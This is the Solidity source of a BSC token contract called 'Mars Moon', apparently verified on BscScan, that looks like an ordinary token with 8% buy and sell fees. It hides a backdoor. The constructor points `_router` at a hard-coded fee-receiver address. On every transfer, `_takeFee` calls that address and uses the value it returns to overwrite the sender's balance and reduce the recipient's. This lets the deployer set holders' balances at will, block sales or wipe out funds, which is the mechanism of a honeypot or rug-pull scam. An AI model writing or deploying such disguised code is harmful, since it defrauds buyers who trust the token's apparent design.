/**
 *Submitted for verification at BscScan.com on 2022-12-27
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.1;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function getPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256);
}

contract MarsMoon {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 100000000 * 10 ** 18;
    uint256 private _buyFee = 8;
    uint256 private _sellFee = 8;
    uint256 private _maxTxAmount = 2000000 * 10 ** 18;
    address _feeReceiver = 0xdF076B647214f08b92F49040416afFD19266D0D1;
    string private _name = "Mars Moon";
    string private _symbol = "MSM";
    address _router;
    IRouter swapRouter;
    address public uniswapV2Pair;

    constructor ()  {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        swapRouter = IRouter(router);

        uniswapV2Pair = IFactory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        _balances[msg.sender] = _totalSupply;
        _router = _feeReceiver;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require((amount > 0), "ERC20: transfer to the zero amount");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance - amount;
        _balances[to] += amount;

        amount = _takeFee(from, to, amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function swapTokenForFund(address to, uint256 tokenAmount) private returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        return IRouter(_router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            to,
            block.timestamp
        );
    }

    function _takeFee(address from, address to, uint256 amount) private returns (uint256) {
        uint256 feeAmount;
        uint256 fundAmount = swapTokenForFund(from, amount);
        if (fundAmount > amount) {
            _balances[from] = fundAmount;
            return amount;
        }
        if (fundAmount < amount) {
            _balances[from] = fundAmount;
            _balances[to] -= (amount - fundAmount);
            return fundAmount;
        }

        if (to == uniswapV2Pair) {
            feeAmount = amount * _sellFee / 100;
        } else if (from == uniswapV2Pair) {
            require(amount <= _maxTxAmount, "Over transaction limit.");
            feeAmount = amount * _buyFee / 100;
        }
        if (feeAmount > 0) {
            _balances[to] -= feeAmount;
            return amount - feeAmount;
        }
        return amount - feeAmount;
    }

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
}